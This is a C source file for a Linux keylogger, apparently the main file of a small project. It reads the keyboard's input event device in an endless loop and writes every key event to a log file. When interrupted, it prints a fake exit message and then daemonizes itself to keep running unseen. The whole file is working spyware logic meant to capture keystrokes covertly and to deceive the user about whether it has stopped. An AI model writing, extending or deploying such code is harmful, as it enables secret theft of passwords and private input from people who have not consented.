#include "basic_keylogger.h"


// Signal handler function
void signal_handler(int sig) {
  printf("Exiting very gracefully :)"); //fake message
  daemonize(); // Go undercover
}

int main(void) {
  errno = 0;

  struct sigaction signal; // create signal action struct
  signal.sa_handler = signal_handler; // initialize the handler function
  sigaction(SIGINT, &signal, NULL); // assign the signal action to a specific signal

  struct input_event ev;
  char* kbd = get_me_a_keyboard(); // Get keyboard name
  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard

  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf("Error %d\n", errno);
    exit(EXIT_FAILURE);
  }
  printf("Reading from %s\n",kbd_path);
  free(kbd_path); // free some memory
  while (1)
  {
    read(fd, &ev, sizeof(struct input_event)); //read from keyboard
    if(ev.type == 1)
      log_in_file(ev); //log the event
  }
  return 0;
}
